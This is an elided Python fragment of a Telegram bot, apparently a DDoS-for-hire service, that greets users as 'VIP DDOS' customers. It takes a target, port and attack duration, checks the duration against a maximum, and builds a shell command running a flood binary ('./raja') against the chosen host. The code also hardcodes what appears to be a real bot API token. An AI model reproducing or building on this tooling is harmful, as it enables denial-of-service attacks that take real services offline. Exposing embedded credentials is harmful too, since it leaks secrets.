...
bot = telebot.TeleBot('7301744883:AAErpx4jMcE7gnlBFxua4upRbuxdckujKGo')
...
def start_command(message):
    ...
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦!", reply_markup=markup)
    ...
    if len(details) == 3:
        ...
        try:
            ...
            if attack_time > MAX_ATTACK_TIME:
                ...
                full_command = f"./raja {target} {port} {attack_time} 1024 1000"  # ✅ Correct variable name
